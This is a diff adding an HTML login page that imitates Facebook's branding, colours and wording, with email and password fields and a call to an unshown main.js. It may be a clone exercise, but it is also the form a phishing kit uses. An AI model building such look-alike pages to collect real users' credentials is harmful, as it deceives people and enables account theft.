@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<head>
+    <title>Login</title>
+	<style>
+		 *{
+		    padding:0;
+			margin:0;
+			box-sizing:border-box;
+		    font-family: Helvetica, Arial, sans-serif;
+		 }
+		 h1{
+		 text-align:center;
+		 color:#1877f2;
+		 font-size:60px;	
+         padding:50px 0 20px 0;
+		 }
+		 .container{
+		    width:90%   
+			margin:0 auto;
+		 }
+		 .row{
+		     display:flex;
+		     justify-content:center;
+			
+		 }
+		 .col{
+		   width:33.3%;
+		 }
+		 .logincontent{
+		 		   box-shadow:0 0 50px #ccc;
+		   background:white;
+		   border-radius:10px;
+		 }
+		 	.loginhead{
+	text-align:center;
+	padding:20px;
+	}
+	.loginhead h2{
+		font-weight:300;
+	}
+
+     #function {
+	 padding:0px 20px;
+	 }
+	  #function input{
+	width:100%;
+	padding:20px;
+	border-radius:5px;
+	border:1px solid #ccc;
+	}
+	#function input:focus{
+	border-color:;
+	outline:0;
+	font-size:15px;
+	}
+	.pass{
+	padding:10px 0;
+	}
+		.btn{
+	display:inline-block;
+	text-decoration:none;
+	color:white;
+	background-color:#1877f2;
+	padding:12px 25px;
+	text-align:center;
+	width:100%;
+	border:none;
+	border-radius:6px;
+	font-size:20px;
+	}
+
+    .para {
+	padding:20px;
+	}	
+	.para h2{
+	   text-align:center;
+	   font-size:18px;
+	   font-weight:300;
+	}
+	.para a{
+	text-decoration:none;
+	
+	}
+	</style>
+
+</head>
+<body>
+<div class="container">
+<h1>facebook</h1>
+<div class="row">
+<div class="col">
+<div class="logincontent">
+ <div class="loginhead">
+                  <h2>Log in a Facebook</h2>
+            </div>
+			
+			
+		<form id="function">
+		<input type="text" placeholder="Mobile number Or Email address" id="MAIL">
+
+         <div class="pass">
+		<input type="password" placeholder="Password" id="PASSWORD">
+         </div>
+		
+		<button class="btn">Log in</button>
+		<div id="result"></div>
+		<div class="para">
+	    <h2><a href="#">forgotten account?</a>  <a href="../index.html">Sign up for Facebook</a></h2>
+		</div>
+	</form>
+	
+</div>
+</div>
+
+</div>
+</div>
+<script src="main.js"></script>
+</body>	   
